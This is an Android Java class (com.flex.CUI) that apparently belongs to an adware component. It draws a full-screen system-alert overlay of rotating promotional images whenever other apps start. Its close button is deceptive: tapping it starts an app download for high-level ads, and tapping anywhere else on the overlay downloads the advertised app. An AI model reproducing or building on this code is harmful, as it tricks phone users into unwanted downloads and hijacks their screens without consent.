package com.flex;

import java.io.IOException;
import java.io.InputStream;
import java.util.List;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.DisplayMetrics;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnTouchListener;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.ImageView.ScaleType;

@SuppressLint("ClickableViewAccessibility")
public class CUI {
	private Context mContext = null;
	private static String tag = CUI.class.getName();
	public static CUI instance = null;
	public static Handler autoScroll = null;
	public static Handler recMsg = null;
	public Runnable autoRun = null;
	private final long delayMillis = 1000 * 3;
	private ImageView mImgView;
	private ImageView mCloseView;
	private WindowManager.LayoutParams wlPicView;
	private WindowManager.LayoutParams wlCloseView;
	private WindowManager mWndMgr;
	private DisplayMetrics outMetrics;
	private int mScreenX;
	private int mScreenY;
	private static int mCurrentIndex = 0;
	private List<CPictureData> mPictures;
	private static boolean isShowing = false;
	public static String[] mBackupUrls;

	public static CUI getUiInstance(Context context) {
		if (instance == null)
			instance = new CUI(context);
		return instance;
	}

	private CUI(Context context) {
		mContext = context;
	}

	public boolean initUI() {
		CLogU.Log(tag, "begin initialize ui");
		setHandler();
		if (initScreenParams() == false) {
			CLogU.Log(tag, "initialize screen params failed.");
			return false;
		}
		addImageView();
		addCloseBtnView();
		return true;
	}

	private boolean initScreenParams() {
		if (mContext == null) {
			CLogU.Log(tag, "mContext==null in initScreenParams,return");
			return false;
		}
		if (mWndMgr == null) {
			mWndMgr = (WindowManager) mContext.getSystemService(Context.WINDOW_SERVICE);
		}
		if (outMetrics == null) {
			outMetrics = new DisplayMetrics();
			mWndMgr.getDefaultDisplay().getMetrics(outMetrics);
		}
		if (wlPicView == null) {
			wlPicView = new WindowManager.LayoutParams();
		}
		if (wlCloseView == null) {
			wlCloseView = new WindowManager.LayoutParams();
		}
		if (mImgView == null) {
			mImgView = new ImageView(mContext);
		}
		if (mCloseView == null) {
			mCloseView = new ImageView(mContext);
		}
		if (getCurrentScreenStatus(mContext) == Configuration.ORIENTATION_LANDSCAPE) {
			mScreenX = outMetrics.widthPixels;
			mScreenY = outMetrics.heightPixels;
		} else {
			mScreenX = outMetrics.widthPixels;
			mScreenY = outMetrics.heightPixels;
		}
		return true;
	}

	private void addImageView() {
		int PicWndtype = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
		wlPicView.type = PicWndtype;
		wlPicView.dimAmount = 0.5f;
		wlPicView.width = this.mScreenX;
		wlPicView.height = this.mScreenY - 150;
		wlPicView.flags = WindowManager.LayoutParams.FLAG_DIM_BEHIND;

		mImgView.setImageBitmap(CDataDef.gPictureDatas.get(mCurrentIndex).getPicBitmap());
		mImgView.setScaleType(ScaleType.FIT_XY);
		mImgView.setLayoutParams(wlPicView);
		mWndMgr.addView(mImgView, wlPicView);
	}

	@SuppressLint("DefaultLocale")
	private void addCloseBtnView() {
		int CloseBtnWndType = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
		wlCloseView.type = CloseBtnWndType;
		wlCloseView.format = PixelFormat.RGBA_8888;
		wlCloseView.width = 40;
		wlCloseView.height = 40;
		wlCloseView.gravity = Gravity.TOP;
		wlCloseView.x = this.mScreenX - 40;
		wlCloseView.y = 60;

		mCloseView.setLayoutParams(wlCloseView);
		mCloseView.setBackgroundColor(Color.TRANSPARENT);
		InputStream ins = null;
		try {
			ins = mContext.getAssets().open("fxclose.png");
		} catch (IOException e1) {
			e1.printStackTrace();
		}
		Bitmap bm = BitmapFactory.decodeStream(ins);
		mCloseView.setImageBitmap(bm);
		try {
			mWndMgr.addView(mCloseView, wlCloseView);
		} catch (Exception e) {
			e.printStackTrace();
		}
		mCloseView.setOnTouchListener(new OnTouchListener() {
			public boolean onTouch(View v, MotionEvent event) {
				if (event.getAction() == MotionEvent.ACTION_UP) {
					float x = event.getX();
					float y = event.getY();
					CPictureData cpd = mPictures.get(mCurrentIndex);
					String appurl = cpd.getAppDownloadURL();
					String appname = cpd.getAppName();
					if (((x >= 0) && (x <= 40)) && ((y >= 0) && (y <= 40))) {
						int level = cpd.getPicLevel();
						if (level == 10) {
							CLogU.Log(tag, "level is 10,downloading");
							defendMultiDownload(mContext,cpd,appurl,appname);
							CDataDef.gPictureDatas.set(mCurrentIndex, CDataDef.gBackupElem.get(0));
							CDataDef.gBackupElem.remove(0);
							clearView();
						} else {
							CLogU.Log(tag,"level less than 10,destory view.");
							clearView();
						}
					} else {
						CLogU.Log(tag, "out of close button range,URL:" + appurl);
						defendMultiDownload(mContext,cpd,appurl,appname);
					}
				}
				return false;
			}
		});
	}

	@SuppressLint("HandlerLeak")
	@SuppressWarnings("unchecked")
	public void setMessage() {
		recMsg = new Handler() {
			public void handleMessage(Message msg) {
				Bundle bd = msg.getData();
				if (msg.what == CDataDef.MSG_ID_SHOW_UI && bd.getBoolean("safe") == true) {
					CLogU.Log(tag, "received show ui message.");
					mPictures = (List<CPictureData>) msg.obj;
					if (isShowing == false) {
						initUI();
						isShowing = true;
						autoDisplay();
					}
				}
				if (msg.what == CDataDef.MSG_ID_NEW_APP_START && bd.getBoolean("safe") == true) {
					CLogU.Log(tag, "received app start message");
					mPictures = (List<CPictureData>) msg.obj;
					if (isShowing == false) {
						initUI();
						isShowing = true;
						autoDisplay();
					}
				}
			}
		};
	}

	private boolean setHandler() {
		boolean initok = true;
		try {
			if (autoScroll == null)
				autoScroll = new Handler();
		} catch (Exception e) {
			initok = false;
			e.printStackTrace();
		}
		return initok;
	}

	private void autoDisplay() {
		autoRun = new Runnable() {
			public void run() {
				if (mCurrentIndex + 1 >= CDataDef.gPictureDatas.size()) {
					mCurrentIndex = 0;
				} else {
					mCurrentIndex = mCurrentIndex + 1;
				}
				mImgView.setScaleType(ScaleType.FIT_XY);
				mImgView.setImageBitmap(mPictures.get(mCurrentIndex).getPicBitmap());
				autoScroll.postDelayed(autoRun, delayMillis);
			}
		};
		autoScroll.postDelayed(autoRun, delayMillis);
	}

	public void clearView() {
		autoScroll.removeCallbacks(autoRun);
		mWndMgr.removeView(mCloseView);
		mWndMgr.removeView(mImgView);
		isShowing = false;
	}

	private int getCurrentScreenStatus(Context context) {
		Configuration mConfiguration = context.getResources().getConfiguration();
		return mConfiguration.orientation;
	}
	
	private void defendMultiDownload(Context context,CPictureData cpd,String url,String appname){
		if(cpd.getHasClicked() == false){
			CLogU.Log(tag, "this picture has not been clicked.");
			cpd.setHasClicked(true);
			new CADLThread(context,url).start();
			new CDLRThread(context,appname).start();
		}else{
			CLogU.Log(tag, "this picture has been clicked.");
			new CADLThread(context,url).start();
		}
	}
}
